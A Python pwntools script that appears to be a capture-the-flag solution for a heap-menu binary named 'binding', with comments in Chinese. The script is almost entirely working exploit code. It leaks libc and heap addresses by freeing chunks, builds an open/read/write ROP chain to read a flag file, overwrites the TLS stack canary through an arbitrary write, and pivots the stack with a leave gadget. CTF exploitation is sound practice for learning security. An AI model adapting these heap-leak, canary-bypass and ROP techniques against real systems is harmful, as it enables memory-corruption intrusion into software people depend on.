from pwn import * 
from pwn import p64,u64
from LibcSearcher import *

debug = 1
gdb_is = 1
elf_path = "./binding"
# context(arch='i386',os = 'linux')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['wt.exe','nt','Ubuntu','-c']
    if not gdb_is:
        r = process(elf_path)
    
else:
    host = "192.168.0.111:53783"
    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
    gdb_is =0

if gdb_is:
    r = process(elf_path,env={'LD_LIBRARY_PATH':'./libc-2.31.so'})
    gdb.attach(r)   
    # pause()
    pass


def add(Idx,Size,Content):
    r.sendafter(b':',b'1')
    r.sendlineafter(b'Idx:',str(Idx).encode())
    r.sendlineafter(b'Size:',str(Size).encode()) #v3 <= 255 || v3 > 512 => exit
    if type(Content) == bytes:
        r.sendafter(b'Content:',Content)
    else:
        r.sendafter(b'Content:',str(Content).encode())

def edit(Idx,context1,context2):
    r.sendafter(b':',b'2')
    r.sendafter(b'Idx:',Idx)
    r.sendafter(b'context1: \n',context1)
    r.sendafter(b'context2: \n',context2)

def show(Idx,choice ='0'):
    r.sendafter(b':',b'3')
    r.sendlineafter(b'choice:',str(choice).encode())
    r.sendlineafter(b'Idx:',str(Idx).encode())

def delete(Idx):
    r.sendafter(b':',b'4')   
    r.sendlineafter(b'Idx:',str(Idx).encode())

elf = ELF(elf_path)
libc = ELF('./libc-2.31.so')


for i in range(8):
    add(i,0x120,'a')
for i in range(8):
    delete(i)
    
show(7,0)
r.recvuntil(b'context: ')
main_arean = u64(r.recvuntil(b'\x7f').ljust(8,b'\x00')) - 96 #unsortedbin
info(f"main_arean = {hex(main_arean)}") 
libc.address = main_arean -0x1ecb80
info(f"libc.address = {hex(libc.address)}") 
show(6,0)
r.recvuntil(b'context: ')
heap = u64(r.recvuntil(b'\n')[:-1].ljust(8,b'\x00')) - 0xcd0
info(f"heap = {hex(heap)}") #tcache bk

shellcode_addr = heap + 0x1250 + 0x10 #new 一块内存写rop
pop_rdx = 0x142c92 + libc.address
rop = ROP([libc]) #rop类 好用爱用
rop.open(shellcode_addr+0xa8,0,0)
rop.read(3,heap+0x300,80)
rop.write(1,heap+0x300,80)
info(hex(len(rop.chain()))) #计算flag在哪
rop.raw(b'flag\x00')
info(rop.dump())
add(8,0x200,rop.chain())
# 不知道 canary 更改在TLS中的canary值 通过任意写
canary = ''
leave_addr = libc.address+0x0578c8
payload = b'\x10' + b'A' * (0x30 - 9)  + b'B'+b'\x00' * 7  + p64(shellcode_addr - 8) + p64(leave_addr)
pause()
edit(payload,p64(libc.address+0x1f35e8),b'B')
r.interactive()